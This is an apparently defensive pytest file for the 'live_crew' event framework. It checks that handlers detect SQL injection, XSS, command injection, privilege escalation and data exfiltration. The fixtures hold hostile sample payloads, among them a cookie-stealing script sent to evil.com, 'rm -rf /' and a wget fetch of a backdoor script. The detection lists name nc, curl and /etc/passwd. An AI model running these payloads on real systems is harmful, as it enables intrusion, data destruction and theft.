"""Advanced security attack edge case tests for production-critical vulnerabilities.

These tests focus on sophisticated attack vectors that target application logic,
data processing, and system boundaries beyond basic path security. They validate
protection against OWASP Top 10 vulnerabilities and advanced persistent threats
that commonly bypass simple input validation.

Each test simulates real attack patterns used by malicious actors to compromise
production systems, ensuring robust defense at all application layers.
"""

import json
import tempfile
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock

import pytest

from live_crew import Action, Event, Orchestrator
from live_crew.config.settings import LiveCrewConfig
from live_crew.scheduling.memory import MemoryScheduler
from live_crew.transports.file import FileEventTransport
from tests.utils import EventDict


class SecurityTestHandler:
    """Handler designed to expose security vulnerabilities in event processing.

    This handler intentionally implements common vulnerable patterns to test
    that the framework's security controls prevent exploitation attempts.
    """

    def __init__(self, crew_id: str, vulnerable_mode: bool = False):
        self.crew_id = crew_id
        self.vulnerable_mode = vulnerable_mode
        self.processed_payloads: list[Any] = []
        self.security_violations: list[dict] = []

    async def handle_event(
        self, event: Event[Any], context: dict[str, Any]
    ) -> list[Action[Any]]:
        """Handle event with optional security vulnerabilities for testing."""
        self.processed_payloads.append(event.payload)

        # Test SQL injection patterns (simulated)
        if isinstance(event.payload, dict):
            payload = event.payload

            # Check for SQL injection attempts in payload values
            for key, value in payload.items():
                if isinstance(value, str):
                    sql_patterns = [
                        "' OR '1'='1",
                        "'; DROP TABLE",
                        "' UNION SELECT",
                        "' OR 1=1--",
                        "'; DELETE FROM",
                        "' OR 'x'='x",
                        "1'; DROP TABLE users; --",
                    ]

                    for pattern in sql_patterns:
                        if pattern.lower() in value.lower():
                            violation = {
                                "type": "sql_injection_attempt",
                                "key": key,
                                "value": value,
                                "pattern": pattern,
                                "timestamp": time.time(),
                            }
                            self.security_violations.append(violation)

                            # In vulnerable mode, process the injection
                            if self.vulnerable_mode:
                                return [
                                    Action.create(
                                        "sql_injection_executed",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]
                            else:
                                # Secure mode: reject the malicious input
                                return [
                                    Action.create(
                                        "sql_injection_blocked",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]

            # Check for XSS attempts
            xss_patterns = [
                "<script>",
                "javascript:",
                "onload=",
                "onerror=",
                "<iframe",
                "eval(",
                "document.cookie",
                "window.location",
            ]

            for key, value in payload.items():
                if isinstance(value, str):
                    for pattern in xss_patterns:
                        if pattern.lower() in value.lower():
                            violation = {
                                "type": "xss_attempt",
                                "key": key,
                                "value": value,
                                "pattern": pattern,
                                "timestamp": time.time(),
                            }
                            self.security_violations.append(violation)

                            if self.vulnerable_mode:
                                return [
                                    Action.create(
                                        "xss_executed",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]
                            else:
                                return [
                                    Action.create(
                                        "xss_blocked",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]

            # Check for command injection attempts
            command_patterns = [
                "; rm -rf",
                "| nc ",
                "&& wget",
                "; curl ",
                "`whoami`",
                "$(id)",
                "; cat /etc/passwd",
                "& ping -c",
            ]

            for key, value in payload.items():
                if isinstance(value, str):
                    for pattern in command_patterns:
                        if pattern.lower() in value.lower():
                            violation = {
                                "type": "command_injection_attempt",
                                "key": key,
                                "value": value,
                                "pattern": pattern,
                                "timestamp": time.time(),
                            }
                            self.security_violations.append(violation)

                            if self.vulnerable_mode:
                                return [
                                    Action.create(
                                        "command_injection_executed",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]
                            else:
                                return [
                                    Action.create(
                                        "command_injection_blocked",
                                        violation,
                                        stream_id=event.stream_id,
                                    )
                                ]

        # Normal processing if no security violations detected
        return [
            Action.create(
                "processed_safely",
                {
                    "payload_type": type(event.payload).__name__,
                    "security_violations": len(self.security_violations),
                    "processing_time": time.time(),
                },
                stream_id=event.stream_id,
            )
        ]


class PrivilegeEscalationTestHandler:
    """Handler that tests privilege escalation attack scenarios.

    Real-world scenarios this protects against:
    - Unauthorized access to admin functions
    - Context manipulation to gain elevated permissions
    - Stream ID spoofing to access other users' data
    - Role-based access control bypasses
    """

    def __init__(self, crew_id: str, required_role: str = "user"):
        self.crew_id = crew_id
        self.required_role = required_role
        self.privilege_attempts: list[dict] = []

    async def handle_event(
        self, event: Event[Any], context: dict[str, Any]
    ) -> list[Action[Any]]:
        """Handle event with privilege escalation detection."""
        payload = event.payload if isinstance(event.payload, dict) else {}
        detected_violations = []

        # Check for stream ID spoofing attempts first (most critical)
        suspicious_stream_patterns = [
            "admin_stream",
            "../stream",
            "../../other_user",
            "system_stream",
            "root_stream",
        ]

        for pattern in suspicious_stream_patterns:
            if pattern in event.stream_id:
                attempt = {
                    "type": "stream_spoofing_attempt",
                    "stream_id": event.stream_id,
                    "pattern": pattern,
                    "timestamp": time.time(),
                }
                self.privilege_attempts.append(attempt)
                detected_violations.append(attempt)

        # Check for privilege escalation attempts in payload
        escalation_indicators = [
            "admin_override",
            "sudo",
            "su -",
            "privilege_escalate",
            "bypass_auth",
            "role_admin",
            "superuser",
            "root_access",
        ]

        for key, value in payload.items():
            if isinstance(value, str):
                for indicator in escalation_indicators:
                    if indicator.lower() in value.lower():
                        attempt = {
                            "type": "privilege_escalation_attempt",
                            "key": key,
                            "value": value,
                            "indicator": indicator,
                            "stream_id": event.stream_id,
                            "timestamp": time.time(),
                        }
                        self.privilege_attempts.append(attempt)
                        detected_violations.append(attempt)

        # Check for context manipulation attempts
        context_manipulation_keys = [
            "user_role",
            "permissions",
            "access_level",
            "is_admin",
            "auth_token",
        ]

        for key in context_manipulation_keys:
            if key in payload:
                attempt = {
                    "type": "context_manipulation_attempt",
                    "key": key,
                    "value": payload[key],
                    "timestamp": time.time(),
                }
                self.privilege_attempts.append(attempt)
                detected_violations.append(attempt)

        # Return appropriate response based on detected violations
        if detected_violations:
            # Return action for the most critical violation (first detected)
            first_violation = detected_violations[0]
            if first_violation["type"] == "stream_spoofing_attempt":
                return [
                    Action.create(
                        "stream_spoofing_blocked",
                        first_violation,
                        stream_id=event.stream_id,
                    )
                ]
            elif first_violation["type"] == "privilege_escalation_attempt":
                return [
                    Action.create(
                        "privilege_escalation_blocked",
                        first_violation,
                        stream_id=event.stream_id,
                    )
                ]
            elif first_violation["type"] == "context_manipulation_attempt":
                return [
                    Action.create(
                        "context_manipulation_blocked",
                        first_violation,
                        stream_id=event.stream_id,
                    )
                ]

        # Normal processing if no privilege escalation detected
        return [
            Action.create(
                "access_granted",
                {
                    "required_role": self.required_role,
                    "escalation_attempts": len(self.privilege_attempts),
                    "access_time": time.time(),
                },
                stream_id=event.stream_id,
            )
        ]


class DataExfiltrationTestHandler:
    """Handler that detects data exfiltration attempts.

    Real-world scenarios this protects against:
    - Attempts to extract sensitive data through event payloads
    - Large data dumps disguised as normal operations
    - Reconnaissance activities to map system structure
    - Covert channel data exfiltration through timing attacks
    """

    def __init__(self, crew_id: str, max_payload_size: int = 1000):
        self.crew_id = crew_id
        self.max_payload_size = max_payload_size
        self.exfiltration_attempts: list[dict] = []
        self.payload_sizes: list[int] = []

    async def handle_event(
        self, event: Event[Any], context: dict[str, Any]
    ) -> list[Action[Any]]:
        """Handle event with data exfiltration detection."""
        payload = event.payload
        payload_str = json.dumps(payload) if payload else ""
        payload_size = len(payload_str)
        self.payload_sizes.append(payload_size)

        # Check for oversized payloads (potential data dumps)
        if payload_size > self.max_payload_size:
            attempt = {
                "type": "oversized_payload_attempt",
                "payload_size": payload_size,
                "max_allowed": self.max_payload_size,
                "timestamp": time.time(),
            }
            self.exfiltration_attempts.append(attempt)

            return [
                Action.create(
                    "oversized_payload_blocked", attempt, stream_id=event.stream_id
                )
            ]

        # Check for sensitive data patterns in payloads
        if isinstance(payload, dict):
            sensitive_patterns = [
                r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b",  # Credit card numbers
                r"\b\d{3}-?\d{2}-?\d{4}\b",  # SSN patterns
                r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",  # Email addresses
                r"\b(?:password|passwd|pwd|secret|key|token)\b",  # Credential keywords
                r"/etc/passwd",  # System files
                r"aws_access_key",  # Cloud credentials
                r"private_key",  # Cryptographic keys
            ]

            import re

            for key, value in payload.items():
                if isinstance(value, str):
                    for pattern in sensitive_patterns:
                        if re.search(pattern, value, re.IGNORECASE):
                            attempt = {
                                "type": "sensitive_data_exfiltration_attempt",
                                "key": key,
                                "pattern": pattern,
                                "data_preview": value[:50] + "..."
                                if len(value) > 50
                                else value,
                                "timestamp": time.time(),
                            }
                            self.exfiltration_attempts.append(attempt)

                            return [
                                Action.create(
                                    "sensitive_data_blocked",
                                    {
                                        **attempt,
                                        "value": "[REDACTED]",
                                    },  # Don't include actual sensitive data
                                    stream_id=event.stream_id,
                                )
                            ]

        # Check for reconnaissance attempts (repeated queries with slight variations)
        recent_payloads = self.payload_sizes[-10:]  # Last 10 payloads
        if len(recent_payloads) >= 5:
            avg_size = sum(recent_payloads) / len(recent_payloads)
            variation = max(recent_payloads) - min(recent_payloads)

            # Suspicious if many similar-sized requests (potential scanning)
            if (
                variation < avg_size * 0.1 and avg_size > 100
            ):  # Low variation, medium size
                attempt = {
                    "type": "reconnaissance_attempt",
                    "average_payload_size": avg_size,
                    "size_variation": variation,
                    "request_count": len(recent_payloads),
                    "timestamp": time.time(),
                }
                self.exfiltration_attempts.append(attempt)

                return [
                    Action.create(
                        "reconnaissance_detected", attempt, stream_id=event.stream_id
                    )
                ]

        # Normal processing if no exfiltration detected
        return [
            Action.create(
                "data_safe",
                {
                    "payload_size": payload_size,
                    "exfiltration_attempts": len(self.exfiltration_attempts),
                    "processing_time": time.time(),
                },
                stream_id=event.stream_id,
            )
        ]


@pytest.fixture
def malicious_events():
    """Create events containing various attack payloads."""
    base_time = datetime(2025, 8, 6, 10, 0, 0, tzinfo=timezone.utc)

    # SQL Injection attempts
    sql_injection_events = [
        EventDict(
            ts=base_time + timedelta(seconds=1),
            kind="user_login",
            stream_id="user_session",
            payload={
                "username": "admin",
                "password": "' OR '1'='1",  # Classic SQL injection
            },
        ),
        EventDict(
            ts=base_time + timedelta(seconds=2),
            kind="search_query",
            stream_id="search_system",
            payload={
                "query": "'; DROP TABLE users; --",  # Destructive SQL injection
                "limit": 10,
            },
        ),
    ]

    # XSS attempts
    xss_events = [
        EventDict(
            ts=base_time + timedelta(seconds=3),
            kind="user_comment",
            stream_id="comment_system",
            payload={"comment": "<script>alert('XSS')</script>", "user_id": "attacker"},
        ),
        EventDict(
            ts=base_time + timedelta(seconds=4),
            kind="user_profile",
            stream_id="profile_system",
            payload={
                "bio": "javascript:document.location='http://evil.com/steal.php?cookie='+document.cookie",
                "name": "Evil User",
            },
        ),
    ]

    # Command injection attempts
    command_injection_events = [
        EventDict(
            ts=base_time + timedelta(seconds=5),
            kind="file_process",
            stream_id="file_system",
            payload={
                "filename": "document.pdf; rm -rf /",  # Command injection
                "action": "process",
            },
        ),
        EventDict(
            ts=base_time + timedelta(seconds=6),
            kind="system_command",
            stream_id="system_api",
            payload={
                "command": "ping 8.8.8.8 && wget http://evil.com/backdoor.sh",
                "timeout": 30,
            },
        ),
    ]

    # Privilege escalation attempts
    privilege_escalation_events = [
        EventDict(
            ts=base_time + timedelta(seconds=7),
            kind="user_action",
            stream_id="admin_stream",  # Suspicious stream name
            payload={"action": "admin_override", "target": "user_permissions"},
        ),
        EventDict(
            ts=base_time + timedelta(seconds=8),
            kind="context_update",
            stream_id="user_session",
            payload={
                "user_role": "admin",  # Trying to manipulate context
                "is_admin": True,
            },
        ),
    ]

    # Data exfiltration attempts
    exfiltration_events = [
        EventDict(
            ts=base_time + timedelta(seconds=9),
            kind="data_export",
            stream_id="export_system",
            payload={
                "query": "SELECT * FROM users WHERE credit_card LIKE '4532%'",
                "format": "csv",
                "email": "attacker@evil.com",
            },
        ),
        EventDict(
            ts=base_time + timedelta(seconds=10),
            kind="bulk_request",
            stream_id="api_system",
            payload={
                "data": "A" * 5000,  # Oversized payload
                "operation": "process",
            },
        ),
    ]

    return (
        sql_injection_events
        + xss_events
        + command_injection_events
        + privilege_escalation_events
        + exfiltration_events
    )


@pytest.fixture
def malicious_events_file(malicious_events):
    """Create temporary file with malicious events."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        events_data = []
        for event in malicious_events:
            events_data.append(
                {
                    "ts": event.ts.isoformat(),
                    "kind": event.kind,
                    "stream_id": event.stream_id,
                    "payload": event.payload,
                }
            )
        json.dump(events_data, f, indent=2)
        return Path(f.name)


class TestSQLInjectionProtection:
    """Test protection against SQL injection attacks in event payloads."""

    @pytest.mark.asyncio
    async def test_sql_injection_detection_and_blocking(self, malicious_events_file):
        """Test that SQL injection attempts are detected and blocked.

        Real-world scenario: Attacker attempts to inject SQL commands through
        event payloads to manipulate database queries or extract data.

        Production failure this prevents: Database compromise, data theft,
        unauthorized access to sensitive information through SQL injection.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            # Security handler in secure mode
            security_handler = SecurityTestHandler(
                "security_crew", vulnerable_mode=False
            )
            scheduler.crew_registry.register_crew(security_handler, [])

            await scheduler.process_events()

            # Verify SQL injection attempts were detected and blocked
            sql_violations = [
                v
                for v in security_handler.security_violations
                if v["type"] == "sql_injection_attempt"
            ]
            assert len(sql_violations) >= 2  # Should detect both SQL injection events

            # Verify blocking actions were generated
            assert (
                action_transport.publish_action.call_count >= 10
            )  # All events processed

            # Check that specific SQL patterns were detected
            detected_patterns = [v["pattern"] for v in sql_violations]
            assert "' OR '1'='1" in detected_patterns
            assert any("'; DROP TABLE" in pattern for pattern in detected_patterns)

        finally:
            malicious_events_file.unlink()

    @pytest.mark.asyncio
    async def test_sql_injection_vulnerable_mode_simulation(
        self, malicious_events_file
    ):
        """Test vulnerable mode to verify attack payloads would succeed without protection.

        Real-world scenario: This verifies that the test attacks are realistic
        and would actually cause damage in an unprotected system.

        Production failure this prevents: False sense of security from tests
        that don't actually represent real attack vectors.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            # Security handler in VULNERABLE mode (for testing only)
            vulnerable_handler = SecurityTestHandler(
                "vulnerable_crew", vulnerable_mode=True
            )
            scheduler.crew_registry.register_crew(vulnerable_handler, [])

            await scheduler.process_events()

            # In vulnerable mode, attacks should be "executed" (simulated)
            sql_violations = [
                v
                for v in vulnerable_handler.security_violations
                if v["type"] == "sql_injection_attempt"
            ]
            assert len(sql_violations) >= 2

            # Actions should indicate successful execution in vulnerable mode
            assert action_transport.publish_action.call_count >= 10

        finally:
            malicious_events_file.unlink()


class TestXSSProtection:
    """Test protection against Cross-Site Scripting (XSS) attacks."""

    @pytest.mark.asyncio
    async def test_xss_attack_detection_and_sanitization(self, malicious_events_file):
        """Test that XSS attempts are detected and sanitized.

        Real-world scenario: Attacker injects malicious scripts into user-generated
        content to steal session cookies or perform actions on behalf of users.

        Production failure this prevents: Account takeover, session hijacking,
        malicious script execution in user browsers.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            security_handler = SecurityTestHandler(
                "xss_protection_crew", vulnerable_mode=False
            )
            scheduler.crew_registry.register_crew(security_handler, [])

            await scheduler.process_events()

            # Verify XSS attempts were detected
            xss_violations = [
                v
                for v in security_handler.security_violations
                if v["type"] == "xss_attempt"
            ]
            assert len(xss_violations) >= 2  # Should detect XSS events

            # Check for specific XSS patterns
            detected_patterns = [v["pattern"] for v in xss_violations]
            assert "<script>" in detected_patterns
            assert "javascript:" in detected_patterns

        finally:
            malicious_events_file.unlink()


class TestCommandInjectionProtection:
    """Test protection against command injection attacks."""

    @pytest.mark.asyncio
    async def test_command_injection_detection_and_blocking(
        self, malicious_events_file
    ):
        """Test that command injection attempts are detected and blocked.

        Real-world scenario: Attacker injects shell commands into parameters
        that are processed by system calls or external processes.

        Production failure this prevents: Remote code execution, system
        compromise, unauthorized access to server resources.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            security_handler = SecurityTestHandler(
                "command_injection_crew", vulnerable_mode=False
            )
            scheduler.crew_registry.register_crew(security_handler, [])

            await scheduler.process_events()

            # Verify command injection attempts were detected
            cmd_violations = [
                v
                for v in security_handler.security_violations
                if v["type"] == "command_injection_attempt"
            ]
            assert len(cmd_violations) >= 2

            # Check for specific command injection patterns
            detected_patterns = [v["pattern"] for v in cmd_violations]
            assert any("; rm -rf" in pattern for pattern in detected_patterns)
            assert any("&& wget" in pattern for pattern in detected_patterns)

        finally:
            malicious_events_file.unlink()


class TestPrivilegeEscalationProtection:
    """Test protection against privilege escalation attacks."""

    @pytest.mark.asyncio
    async def test_privilege_escalation_detection(self, malicious_events_file):
        """Test that privilege escalation attempts are detected and blocked.

        Real-world scenario: Attacker attempts to gain elevated permissions
        by manipulating context, stream IDs, or payload parameters.

        Production failure this prevents: Unauthorized access to admin functions,
        data breach through privilege escalation, system compromise.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            privilege_handler = PrivilegeEscalationTestHandler(
                "privilege_crew", required_role="user"
            )
            scheduler.crew_registry.register_crew(privilege_handler, [])

            await scheduler.process_events()

            # Verify privilege escalation attempts were detected
            escalation_attempts = privilege_handler.privilege_attempts
            assert len(escalation_attempts) >= 2

            # Check for specific attack types
            attack_types = [attempt["type"] for attempt in escalation_attempts]
            assert "privilege_escalation_attempt" in attack_types
            assert "context_manipulation_attempt" in attack_types

        finally:
            malicious_events_file.unlink()

    @pytest.mark.asyncio
    async def test_stream_id_spoofing_protection(self, malicious_events_file):
        """Test protection against stream ID spoofing attacks.

        Real-world scenario: Attacker uses crafted stream IDs to access
        other users' data or system administrative streams.

        Production failure this prevents: Cross-user data access, unauthorized
        system operations, privacy violations.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            privilege_handler = PrivilegeEscalationTestHandler("stream_protection_crew")
            scheduler.crew_registry.register_crew(privilege_handler, [])

            await scheduler.process_events()

            # Check for stream spoofing detection
            spoofing_attempts = [
                attempt
                for attempt in privilege_handler.privilege_attempts
                if attempt["type"] == "stream_spoofing_attempt"
            ]
            assert len(spoofing_attempts) >= 1  # Should detect admin_stream usage

        finally:
            malicious_events_file.unlink()


class TestDataExfiltrationProtection:
    """Test protection against data exfiltration attacks."""

    @pytest.mark.asyncio
    async def test_oversized_payload_detection(self, malicious_events_file):
        """Test detection of oversized payloads used for data exfiltration.

        Real-world scenario: Attacker uses large payloads to extract data
        or causes denial of service through resource exhaustion.

        Production failure this prevents: Data theft through large responses,
        memory exhaustion, network bandwidth abuse.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            # Set small payload limit to trigger detection
            exfiltration_handler = DataExfiltrationTestHandler(
                "exfiltration_crew", max_payload_size=1000
            )
            scheduler.crew_registry.register_crew(exfiltration_handler, [])

            await scheduler.process_events()

            # Verify oversized payload detection
            exfiltration_attempts = exfiltration_handler.exfiltration_attempts
            oversized_attempts = [
                attempt
                for attempt in exfiltration_attempts
                if attempt["type"] == "oversized_payload_attempt"
            ]
            assert len(oversized_attempts) >= 1  # Should detect the large payload

        finally:
            malicious_events_file.unlink()

    @pytest.mark.asyncio
    async def test_sensitive_data_pattern_detection(self, malicious_events_file):
        """Test detection of sensitive data patterns in payloads.

        Real-world scenario: Attacker attempts to exfiltrate credit card numbers,
        SSNs, or other sensitive data through event payloads.

        Production failure this prevents: Sensitive data exposure, compliance
        violations, privacy breaches.
        """
        try:
            config = LiveCrewConfig(slice_ms=100)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            exfiltration_handler = DataExfiltrationTestHandler("sensitive_data_crew")
            scheduler.crew_registry.register_crew(exfiltration_handler, [])

            await scheduler.process_events()

            # Verify sensitive data detection
            exfiltration_attempts = exfiltration_handler.exfiltration_attempts
            sensitive_attempts = [
                attempt
                for attempt in exfiltration_attempts
                if attempt["type"] == "sensitive_data_exfiltration_attempt"
            ]
            assert len(sensitive_attempts) >= 1  # Should detect credit card pattern

        finally:
            malicious_events_file.unlink()


class TestAdvancedSecurityIntegration:
    """Test integration of multiple security controls working together."""

    @pytest.mark.asyncio
    async def test_comprehensive_security_defense_layers(self, malicious_events_file):
        """Test that multiple security controls work together effectively.

        Real-world scenario: Production systems need defense in depth with
        multiple security layers to protect against sophisticated attacks.

        Production failure this prevents: Security bypass through attacking
        a single weak point when other controls might have caught the attack.
        """
        try:
            config = LiveCrewConfig(slice_ms=50)
            event_transport = FileEventTransport(malicious_events_file)
            action_transport = AsyncMock()

            scheduler = MemoryScheduler(config, event_transport, action_transport)

            # Deploy multiple security handlers (defense in depth)
            security_handler = SecurityTestHandler(
                "security_layer", vulnerable_mode=False
            )
            privilege_handler = PrivilegeEscalationTestHandler("privilege_layer")
            exfiltration_handler = DataExfiltrationTestHandler(
                "exfiltration_layer", max_payload_size=2000
            )

            scheduler.crew_registry.register_crew(security_handler, [])
            scheduler.crew_registry.register_crew(privilege_handler, [])
            scheduler.crew_registry.register_crew(exfiltration_handler, [])

            await scheduler.process_events()

            # Verify all security layers detected threats
            total_security_violations = len(security_handler.security_violations)
            total_privilege_attempts = len(privilege_handler.privilege_attempts)
            total_exfiltration_attempts = len(
                exfiltration_handler.exfiltration_attempts
            )

            assert total_security_violations >= 4  # SQL + XSS + Command injection
            assert (
                total_privilege_attempts >= 2
            )  # Privilege escalation + context manipulation
            assert (
                total_exfiltration_attempts >= 1
            )  # Oversized payload or sensitive data

            # Verify all events were processed by all handlers
            assert (
                action_transport.publish_action.call_count >= 30
            )  # 10 events * 3 handlers

        finally:
            malicious_events_file.unlink()

    @pytest.mark.asyncio
    async def test_orchestrator_level_security_integration(self):
        """Test security controls integrated at Orchestrator API level.

        Real-world scenario: High-level APIs should have built-in security
        without requiring application developers to implement security logic.

        Production failure this prevents: Security vulnerabilities introduced
        by application code that doesn't properly implement security controls.
        """
        # Create events with various attack vectors
        security_test_events = [
            {
                "ts": "2025-08-06T10:00:01Z",
                "kind": "user_input",
                "stream_id": "user_session",
                "payload": {
                    "username": "admin' OR 1=1 --",  # SQL injection
                    "message": "<script>alert('xss')</script>",  # XSS
                },
            },
            {
                "ts": "2025-08-06T10:00:02Z",
                "kind": "system_command",
                "stream_id": "admin_stream",  # Suspicious stream
                "payload": {
                    "command": "ls; cat /etc/passwd",  # Command injection
                    "user_role": "admin",  # Privilege escalation
                },
            },
        ]

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(security_test_events, f)
            security_file = Path(f.name)

        try:
            orchestrator = Orchestrator.from_file(security_file)

            # Integrated security handler
            class OrchestrationSecurityHandler:
                def __init__(self):
                    self.crew_id = "orchestration_security"
                    self.security_handler = SecurityTestHandler(
                        "internal_security", vulnerable_mode=False
                    )
                    self.privilege_handler = PrivilegeEscalationTestHandler(
                        "internal_privilege"
                    )

                async def handle_event(
                    self, event: Event[Any], context: dict[str, Any]
                ) -> list[Action[Any]]:
                    # Run multiple security checks
                    security_actions = await self.security_handler.handle_event(
                        event, context
                    )
                    privilege_actions = await self.privilege_handler.handle_event(
                        event, context
                    )

                    # Combine security results
                    all_actions = security_actions + privilege_actions

                    # Add orchestrator-level security response
                    security_summary = Action.create(
                        "orchestrator_security_summary",
                        {
                            "security_violations": len(
                                self.security_handler.security_violations
                            ),
                            "privilege_attempts": len(
                                self.privilege_handler.privilege_attempts
                            ),
                            "total_security_actions": len(all_actions),
                        },
                        stream_id=event.stream_id,
                    )

                    return all_actions + [security_summary]

            security_handler = OrchestrationSecurityHandler()
            orchestrator.register_handler(security_handler)

            # Run with integrated security
            result = await orchestrator.run()

            # Verify security processing
            assert result.events_processed == 2

            # Verify security violations were detected
            assert len(security_handler.security_handler.security_violations) >= 2
            assert len(security_handler.privilege_handler.privilege_attempts) >= 1

        finally:
            security_file.unlink()
